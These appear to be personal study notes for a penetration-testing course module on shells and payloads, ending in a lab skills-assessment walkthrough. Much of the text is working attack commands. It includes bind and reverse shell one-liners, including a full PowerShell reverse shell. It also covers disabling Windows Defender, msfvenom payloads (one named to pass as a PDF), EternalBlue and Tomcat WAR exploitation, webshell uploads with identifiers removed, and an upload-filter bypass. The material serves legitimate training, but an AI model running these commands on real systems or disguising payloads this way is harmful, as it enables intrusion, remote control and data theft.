# Shells & Payloads

1. [Shell Basics](#shell-basics)
1. [Payloads](#payloads)
1. [Windows Shells](#windows-shells)
1. [NIX Shells](#nix-shells)
1. [Web Shells](#web-shells)
1. [Skills Assessment](#skills-assessment)

## Shell Basics

* Every OS has a shell, and we need to use a terminal emulator to interact with it; command language interpreters or shell scripting languages are used with this

* In Linux, for example, we can use commands like ```ps``` and ```env``` to identify the shell being used

* Bind shells:

  * target system has a listener started and waits for a connection from attacker
  * usually strict incoming firewalls rules and NAT configuration is implemented, which means we need to be on the internal network
  * example:

    ```sh
    # on target
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

    # on attacker machine
    nc -nv 10.129.41.200 7777
    ```

* Reverse shells:

  * attacker has listener running, and target initiates connection
  * example:

    ```sh
    # on attacker, using a common port
    sudo nc -nvlp 443

    # on Windows target, disable AV
    Set-MpPreference -DisableRealtimeMonitoring $true
    
    # then use powershell payload in cmd
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```

## Payloads

* In information security, payload refers to the command/code that performs the malicious action

* Metasploit example:

  ```sh
  msfconsole

  use exploit/windows/smb/psexec

  options

  set RHOSTS 10.129.180.71

  set SHARE ADMIN$

  set SMBPass password123

  set SMBUser username

  set LHOST tun0

  exploit
  # if it is successful, we get a shell
  ```

* MSFvenom for crafting payloads:

  ```sh
  msfvenom -l payloads
  # list available payloads

  # windows/meterpreter/reverse_tcp - staged payload - multiple 'stages'
  # windows/meterpreter_reverse_tcp - stageless payload

  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
  # crafting a stageless payload

  # we can then get this stageless payload transferred to victim machine

  # setup listener
  sudo nc -nvlp 443

  # once payload is executed, we will get reverse shell on listener

  # crafting a stageless payload for Windows
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
  ```

## Windows Shells

* Fingerprinting Windows:

  * when pinging target, TTL in response would be either 32 or 128
  * ```nmap``` scan with ```-O``` option
  * banner grabbing using ```banner.nse``` script

* For Windows, we can consider common payload formats like DLLs, batch files, VBS scripts, MSI files and PowerShell scripts

* Payload generation:

  * [msfvenom, metasploit](https://github.com/rapid7/metasploit-framework)
  * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
  * [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)
  * [Nishang](https://github.com/samratashok/nishang)
  * [darkarmour](https://github.com/bats3c/darkarmour)

* Example:

  ```sh
  nmap -v -A 10.129.201.97
  # enumerate host

  msfconsole
  # check for EternalBlue exploit

  use auxiliary/scanner/smb/smb_ms17_010

  options

  set RHOSTS 10.129.201.97

  run
  # target seems vulnerable

  use exploit/windows/smb/ms17_010_psexec

  options

  # set required options

  run
  # this gives us meterpreter shell as SYSTEM
  ```

## NIX Shells

* Example:

  ```sh
  nmap -sC -sV 10.129.201.101

  # suppose we have a vulnerable web app
  # in this example, rconfig 3.9.6

  # we can search for exploits associated with this version
  
  # in this example, we can load the exploit "rconfig_vendors_auth_file_upload_rce.rb"
  # and run it

  # once we get a reverse shell, we can stabilize it
  python -c 'import pty; pty.spawn("/bin/sh")'
  ```

## Web Shells

* Web shell - browser-based shell session that can be used to interact with the target

* [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) - repo of ready-made webshells for different web app languages:

  ```sh
  locate laudanum

  cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx

  vim demo.aspx
  # edit 'allowedIps' - include our IP address here
  # remove banner, ASCII art, and any possible identifiers

  # then upload the webshell in the webapp
  # and navigate to uploaded directory with webshell filename, to get RCE
  ```

* Antak webshell:

  * ASPX (Active Server Page Extended) is a filetype for Microsoft's ASP.NET framework; ASPX-based webshells can be used to control underlying Windows system

  * Antak is a webshell built-in ASP.Net - it uses PowerShell to interact with the host:

    ```sh
    locate antak.aspx

    # copy the file for modification
    cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx

    vim Upload.aspx
    # edit username and password for access to webshell
    # remove banner, ASCII art

    # upload the aspx webshell and navigate to uploaded directory
    # once we log into the webshell, we can use PS commands, upload/download files, encode & execute scripts, and more
    ```

* PHP webshells:

  * for file uploads in PHP web apps, we can attempt bypassing filetype restrictions and upload PHP webshells

  * for bypass, we can intercept the webshell upload request and modify fields like ```Content-Type``` from 'application/x-php' to 'image/gif'

  * we can then navigate to the uploads directory and execute commands from the web shell

## Skills Assessment

* We have been given a foothold connection:

  ```sh
  xfreerdp /v:10.129.204.126 /u:htb-student /p:"HTB_@cademy_stdnt!"
  ```

* We have 3 hosts to enumerate in the internal network 172.16.1.0/23:

  * host-01 - 172.16.1.11:8080
  * host-02 - blog.inlanefreight.local
  * host-03 - 172.16.1.13

* Once we have access to the foothold machine 'skills-foothold', we can start by enumerating host-01:

  ```sh
  curl http://172.16.1.11:8080
  # gives us a page for Tomcat
  # we can see the version Apache Tomcat/10.0.11

  firefox
  # view the page in browser

  # we have a file in Desktop
  cat Desktop/access-creds.txt
  # this gives us two creds
  # admin:admin123!@# - for blog
  # tomcat:Tomcatadm - for tomcat

  # using these creds, we can login
  # to Tomcat app manager

  # in the app manager, we have an upload option
  # for WAR files

  ip a s
  # shows our IP in internal network 172.16.1.5/23

  # we can now use metasploit modules for WAR file upload exploit
  # or craft and upload manually

  # trying automated first
  msfconsole -q

  search tomcat

  use exploit/multi/http/tomcat_mgr_upload

  options

  set LHOST 172.16.1.5

  set HttpPassword Tomcatadm

  set HttpUsername tomcat

  set RHOSTS 172.16.1.11

  set RPORT 8080

  run
  # this does not work

  # we can try manual approach now

  # craft payload

  msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4445 -f war -o reverse-shell.war

  nc -nvlp 4445

  # upload, deploy and trigger the payload
  ```

* After using the [WAR file reverse shell upload approach](https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/), we get a reverse shell:

  ```sh
  whoami
  # nt authority\local service

  hostname
  # shells-winsvr

  dir C:\Share
  # first flag
  ```

* Now, we can start checking and enumerating host-02:

  ```sh
  # back in foothold shell
  ping blog.inlanefreight.local
  # we have access, we can check the webpage

  # in firefox, we can view the blog
  ```

* In the above blog page by Slade Wilson, the last post mentions a vulnerability - <https://www.exploit-db.com/exploits/50064> - this seems to be an exploit for the blog itself, so we can try it:

  ```sh
  searchsploit 50064
  # shows the exploit path

  searchsploit -m php/webapps/50064.rb
  # mirrors exploit to current directory

  # we can import this exploit to metasploit
  ls -la /root/.msf4
  # copy the file here

  sudo cp 50064.rb /root/.msf4/
  
  # close and relaunch metasploit again
  msfconsole -q

  reload_all
  # reload all modules

  search 50064
  # now we have our exploit here

  use 0

  options

  set LPORT 5555

  # we can set the creds found earlier for blog
  set USERNAME admin

  set PASSWORD admin123!@#

  set RHOSTS blog.inlanefreight.local

  run
  # the exploit does not work

  # we missed an option 'vhost'

  options

  set VHOST blog.inlanefreight.local

  run
  # now the exploit works
  # we have a meterpreter shell

  sysinfo

  cat /customscripts/flag.txt
  # second flag
  ```

* Now, for host-03, we have not been given much info, so we need to start with a quick scan:

  ```sh
  nmap -sC -sv -Pn 172.16.1.13
  # this shows we have a target Windows Server
  # named 'SHELLS-WINBLUE'
  ```

* Following the theme, we can attempt with the EternalBlue exploit first:

  ```sh
  msfconsole -q

  use exploit/windows/smb/ms17_010_psexec

  options

  set RHOSTS 172.16.1.13

  set LHOST 172.16.1.5

  set LPORT 4446

  run

  # we get a Meterpreter shell

  cat C:/Users/Administrator/Desktop/Skills-flag.txt
  # flag
  ```
